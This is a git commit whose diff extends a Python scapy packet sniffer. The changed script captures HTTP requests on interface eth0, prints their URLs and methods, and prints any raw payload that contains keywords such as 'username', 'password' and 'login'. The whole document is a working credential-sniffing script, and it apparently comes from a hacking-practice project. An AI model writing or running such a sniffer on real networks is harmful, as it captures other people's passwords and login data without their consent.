878cfaee24361360c48734cd671e29f287770659
Julio Wandekoken <jwandekoken@gmail.com>
2022-01-01 09:20:45 -0500

    feat: filtering for usefull information

--- main.py
+++ main.py
@@ -1,14 +1,32 @@
 import scapy.all as scapy
 from scapy.layers import http
 
+
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="tcp")
-    
+
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
+        print(packet.show())
+        print("----------")
+        # get url and Http Method and print them
+        url = packet[http.HTTPRequest].Host.decode("utf-8") + packet[
+            http.HTTPRequest
+        ].Path.decode("utf-8")
+        http_method = packet[http.HTTPRequest].Method.decode("utf-8")
+        print("> HTTP Method: %s" % http_method)
+        print("> URL: %s" % url)
+
+        # get raw payload and print, if theres any of the keywords we are interested in
         if packet.haslayer(scapy.Raw):
-            print(str(packet[scapy.Raw].load))
+            keywords = ["username", "password", "uname", "pass", "email", "login"]
+            payload = str(packet[scapy.Raw].load)
+            for term in keywords:
+                if term in payload:
+                    print("> Payload captured: %s" % payload)
+                    # if more than one term is in the payload, we just want to print it one time, so we are breaking the loop
+                    break
 
 
 sniff("eth0")
